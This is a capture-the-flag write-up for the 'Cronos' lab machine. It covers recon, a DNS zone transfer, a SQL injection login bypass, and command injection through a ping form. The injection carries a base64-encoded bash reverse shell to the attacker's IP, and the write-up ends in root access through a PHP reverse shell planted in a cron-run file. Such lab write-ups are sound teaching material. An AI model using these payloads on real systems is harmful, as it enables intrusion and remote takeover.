# cronos - writeup

## Services
```bash
└─$ nmap -sC -sV -p 22,53,80 -o nmap/tcp-script $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-27 20:05 EDT
Nmap scan report for 10.129.182.53
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.97 seconds
```
3 open ports:
* 22 - This version suggest the OS is Ubuntu Xenial
* 53 - ISC BIND 9.10.3-P4. We can query this for any subdomains we find or attempt a zone transfer.
* 80 - This version also suggests Ubuntu Xenial

We can be confident the OS of the server is Ubuntu Xenial based off of the version of services its running.

## DNS enum
The dns server did return a zone transfer:
```bash
└─$ dig @$IP cronos.htb AXFR

; <<>> DiG 9.18.12-1-Debian <<>> @10.129.182.53 cronos.htb AXFR
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 48 msec
;; SERVER: 10.129.182.53#53(10.129.182.53) (TCP)
;; WHEN: Tue Jun 27 21:30:56 EDT 2023
;; XFR size: 7 records (messages 1, bytes 203)
```

The zone transfer returned 3 hostnames. ns1 is likely just the nameserver but we will check it out anyway

## HTTP

### cronos.htb
Issuing a curl command to cronos.htb reveals that the application is using the laravel framework which runs on PHP:
`Set-Cookie: laravel_session=eyJpdiI6IlBGU1Z3MG1xdEFNYmN2ajRlRXhsamc9PSIsInZhbHVlIjoiUGNDZ2x0dFdOWmlNMU94MkpXWmJyY3dKXC9DWWxwQ3BJd0JwSEpWOEdaZWhaTm42WG9IWHVRMHhIS2NGSEhLZlwvTDh2eXJYc2NwaHA2clwvRlBIM1FTc3c9PSIsIm1hYyI6IjY2M2Y0YTMxNjg0Y2E5MDI4NjE5MmU2YjFjZWQ5OWVkYTQ5MDE3MjkxZjJlNWMzYmE5N2I1ZTg4OGI2ZWRlYzAifQ%3D%3D; expires=Wed, 28-Jun-2023 03:34:51 GMT; Max-Age=7200; path=/; HttpOnly`

All of the hyperlinks on the Cronos home page lead to a Laravel website. 
Directory enumeration yielded no results.


### admin.cronos.htb
home page is a login page

Login page authentication can be bypassed with simple SQL injection:
`admin' OR 1=1-- -`

On the welcome.php page there are two networking tools we can invoke: `traceroute` and `ping`. 
Tested the ping tool and it successfully reaches my machine
```bash
21:53:29.543522 IP cronos.htb > 10.10.14.55: ICMP echo request, id 2737, seq 1, length 64
21:53:29.543544 IP 10.10.14.55 > cronos.htb: ICMP echo reply, id 2737, seq 1, length 64
```
These input for these tools are vulnerable to a simle command injection payload and the response is reflected in the browser.
`8.8.8.8; whoami`

We can encode our reverse shell payload and decode it server side to catch a reverse shell
`8.8.8.8; echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTUvNjY2NiAgMD4mMSAg | base64 -d | bash`

## initial foothold

We get our initial foothold as www-data system account so we have access to all the files in the admin/ web application directory. Taking a look at the config.php file we get get credentials to the db:
```bash
www-data@cronos:/var/www/admin$ cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```

Attempted to test for password reuse on a user account with the db password, but it failed.

### MYSQL
We can connect to the mysql db locally and get the credentials stored there
```bash
mysql> SELECT * FROM users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)
```
And this looks like an md5 hash, however, we are unable to crack this hash and so it cannot be used.

### crontab

There is a cronjob being run every minute on this machine that runs a laravel script:
```bash
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```
The danger of this is that its being run by root, but it is a file owned by www-data.

We just need to use laravel syntax and find an exploit to write in this `artisan` file and we should be able to get root.

Since Laravel is a php framework I just injserted a reverse shell in PHP from pentestmonkey in the artisan file and caught the reverse Root shell

Now that we are Root we can collect and submit the flags.
